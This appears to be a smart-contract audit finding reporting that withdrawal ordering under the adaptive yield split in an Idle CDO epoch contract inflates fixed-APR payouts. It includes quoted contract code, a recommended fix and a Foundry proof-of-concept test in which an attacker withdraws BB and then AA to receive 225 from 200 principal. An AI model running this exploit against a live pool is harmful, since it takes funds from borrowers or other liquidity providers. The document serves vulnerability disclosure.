### Title
Withdrawal ordering inflates fixed-APR payouts through AYS ratio updates - (File: contracts/IdleCDOEpochVariant.sol)

### Summary
`requestWithdraw` prices each withdrawal using the current `trancheAPRSplitRatio`, then `_withdrawOps` immediately updates that ratio from the post-withdrawal tranche composition. Because the adaptive yield split is quadratic in the AA/TVL ratio, an attacker holding both tranche classes can withdraw BB first to boost the AA ratio and then withdraw AA at a higher yield allocation. The resulting negative `interestForOverUnderPerformance` is either passed to remaining LPs or clamped to zero when no active basis remains, rather than reducing the attacker’s pending receipts. This makes aggregate payouts order-dependent and can inflate `pendingWithdraws` above the borrower’s contractual epoch liability.

### Finding Description
`requestWithdraw` calculates tranche-specific interest before burning tranche tokens, stores the difference between proportional interest and tranche interest in `interestForOverUnderPerformance`, and only then updates the AYS ratio inside `_withdrawOps`. [1](#0-0)  The AYS ratio update uses the post-withdrawal AA ratio twice—once to derive `aux` and again as the multiplier—so allocation is nonlinear and sensitive to withdrawal ordering. [2](#0-1) 

For example, with 100 AA NAV, 100 BB NAV, a 10% APR, a one-year epoch, and zero buffer or fees, the 50% AA ratio produces a 25% AA/75% BB interest split. A BB withdrawal receives 15 interest instead of its proportional 10, creating `diff = -5`; after BB is removed, the AA ratio becomes 100%, so a subsequent AA withdrawal receives the full remaining 10 interest. The receipts total 225 despite the pool consisting of only 200 principal and 20 contractual epoch interest. [3](#0-2) 

`interestForOverUnderPerformance` is intended to offset this over-allocation against active interest, but `startEpoch` clamps the adjusted value to zero. When all active NAV has been withdrawn, the negative `-5` adjustment is discarded while the inflated 225 `pendingWithdraws` remains payable. [4](#0-3)  The strategy mints the request-time claim amount to the user and adds it directly to `pendingWithdraws`. [5](#0-4)  At epoch end, the CDO pulls that pending amount from the borrower and transfers it to the strategy for claims. [6](#0-5) 

### Impact Explanation
The broken invariant is conservation of the fixed-APR epoch liability: pending receipts plus active expected interest should equal principal plus the configured epoch interest. In the example above, the attacker receives 225 from 200 principal for a 10% epoch, stealing 5 underlying—25% of the epoch’s expected 20 interest—from the borrower or from yield that should remain available to active LPs. [7](#0-6)  If the honest borrower only approves the contractual liability, the inflated transfer can fail and incorrectly trigger the borrower-default path. [8](#0-7) 

### Likelihood Explanation
The attack requires only a wallet allowed to deposit and request withdrawals while AYS is enabled, holdings in both tranche classes, and execution during the buffer before `startEpoch`. No privileged action, timing collision, external oracle manipulation, or additional account is required. It is strongest in fixed-APR pools with both tranches populated; if active LPs remain, the negative carry reduces their expected epoch interest, and if all active NAV exits, the zero clamp creates direct borrower overpayment.

### Recommendation
Make withdrawal-receipt pricing order-independent. At minimum, freeze the tranche composition/`trancheAPRSplitRatio` used for all withdrawal requests in the same buffer, or defer receipt-interest calculation until epoch start using a consistent snapshot. Additionally, track and apply negative `interestForOverUnderPerformance` against subsequent pending-receipt claims or the aggregate pending basis instead of allowing the negative carry to be discarded by the zero clamp.

### Proof of Concept
Drop this test into the existing `IdleCreditVault.t.sol` Foundry harness:

```solidity
function testWithdrawalOrderingInflatesPendingPayout() external {
    address attacker = makeAddr("ays-order-attacker");
    uint256 amount = 100 * ONE_SCALE;

    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);

    vm.startPrank(manager);
    cdoEpoch.setEpochParams(365 days, 0);
    IdleCreditVault(address(strategy)).setAprs(10e18, 10e18); // 10% APR
    vm.stopPrank();

    // Equal AA and BB NAV leaves AYS at 50% TVL ratio and 25% AA interest split.
    uint256 bbShares = _depositWithUser(attacker, amount, false);
    uint256 aaShares = _depositWithUser(attacker, amount, true);
    assertEq(cdoEpoch.trancheAPRSplitRatio(), 25_000);

    vm.startPrank(attacker);

    // BB gets 75% of the 20-unit epoch interest: 15.
    uint256 bbPayout = cdoEpoch.requestWithdraw(bbShares, address(BBtranche));
    assertEq(bbPayout, 115 * ONE_SCALE);
    assertEq(cdoEpoch.interestForOverUnderPerformance(), -5 * int256(ONE_SCALE));

    // Removing BB made AA 100% of TVL, so AA now gets 100% of remaining interest.
    uint256 aaPayout = cdoEpoch.requestWithdraw(aaShares, address(AAtranche));
    assertEq(aaPayout, 110 * ONE_SCALE);
    vm.stopPrank();

    // Fair payout is 200 principal + 20 interest; inflated pending basis is 225.
    uint256 pending = IdleCreditVault(address(strategy)).pendingWithdraws();
    assertEq(pending, 225 * ONE_SCALE);
    assertEq(cdoEpoch.interestForOverUnderPerformance(), -5 * int256(ONE_SCALE));

    vm.prank(manager);
    cdoEpoch.startEpoch();

    // The negative offset is clamped away instead of reducing pendingWithdraws.
    assertEq(cdoEpoch.expectedEpochInterest(), 0);
    assertEq(IdleCreditVault(address(strategy)).pendingWithdraws(), pending);

    deal(defaultUnderlying, borrower, pending);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), pending);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 balanceBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();

    assertEq(underlying.balanceOf(attacker) - balanceBefore, 225 * ONE_SCALE);
}
```

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L254-263)
```text
    // calculate expected interest 
    // NOTE: all withdrawal requests, burn tranche tokens and decrease getContractValue,
    // this can be done only prior to the start of the epoch so getContractValue() is the total amount net
    // of all withdrawal requests. We add the fee that we should get for normal pending withdraws
    // we also add/remove the over/under performance caused by withdraw requests.
    // Pending fees remain due even if fixed-APR requests exhaust active interest.
    int256 adjustedActiveInterest = int256(_calcInterest(getContractValue())) + interestForOverUnderPerformance;
    if (adjustedActiveInterest < 0) adjustedActiveInterest = 0;
    expectedEpochInterest = pendingWithdrawFees + uint256(adjustedActiveInterest);
    interestForOverUnderPerformance = 0;
```

**File:** contracts/IdleCDOEpochVariant.sol (L359-364)
```text
    // Base interest for stopEpoch: explicit override (>1) or precomputed expected epoch interest.
    uint256 _expectedInterest;
    // Strategy finalizes APR0 bucket state and returns adjusted stopEpoch values.
    (_expectedInterest, _pendingWithdrawFees) = _strategy.prepareStopEpochWithApr0(_interest);
    // Pending withdraws may be increased during APR0 settlement, so read after prepareStopEpochWithApr0.
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
```

**File:** contracts/IdleCDOEpochVariant.sol (L406-411)
```text
    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
```

**File:** contracts/IdleCDOEpochVariant.sol (L548-553)
```text
  /// @dev Get funds from borrower through an external self-call so callers can use try/catch.
  /// @param _amount Total amount to transfer
  function getFundsFromBorrower(uint256 _amount) external {
    _checkNotAllowed(msg.sender != address(this));
    _transferUnderlyingsFrom(_borrower(), address(this), _amount);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L772-790)
```text
    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L862-877)
```text
    uint256 _buffer = bufferPeriod;
    // calculate total vault interest (they don't get the interest for the buffer period for withdraw requests so 
    // we scale it back since _calcInterest is scaling the interest with tht buffer period),
    uint256 totInterest = _calcInterest(_managedContractValue()) * _duration / (_duration + _buffer);
    // calculate total tranche interest for the whole tranche supply
    uint256 totTrancheInterest = _calcTrancheInterestShare(totInterest, _tranche);
    // calculate interest for the given tranche and given amount
    uint256 _trancheBal = _lastSavedNAV(_tranche);
    _interest = _trancheBal == 0 ? 0 : _amount * totTrancheInterest / _trancheBal;
    // calculate the interest that the _amount would have received if there was no split ratio (ie interest split based only on tvl).
    // This is used to calculate the interest that should be added to the expectedEpochInterest when 
    // withdrawing an AA tranche or the interest that should be removed from expectedEpochInterest when
    // withdrawing a BB tranche
    uint256 interestWithoutSplitRatio = _calcInterest(_amount) * _duration / (_duration + _buffer);
    // difference between total interest and tranche interest (positive for AA, negative for BB)
    _diff = int256(interestWithoutSplitRatio) - int256(_interest);
```

**File:** contracts/IdleCDOCreditVault.sol (L384-400)
```text
  /// @notice updates trancheAPRSplitRatio based on the current tranches TVL ratio between AA and BB
  /// @dev the idea here is to limit the min and max APR that the senior tranche can get
  function _updateSplitRatio(uint256 tvlAARatio) internal virtual {
    uint256 _minSplit = minAprSplitAYS;
    _minSplit = _minSplit == 0 ? AA_RATIO_LIM_DOWN : _minSplit;

    if (isAYSActive) {
      uint256 aux;
      if (tvlAARatio >= AA_RATIO_LIM_UP) {
        aux = tvlAARatio == FULL_ALLOC ? FULL_ALLOC : AA_RATIO_LIM_UP;
      } else if (tvlAARatio > _minSplit) {
        aux = tvlAARatio;
      } else {
        aux = _minSplit;
      }
      trancheAPRSplitRatio = aux * tvlAARatio / FULL_ALLOC;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-279)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
```
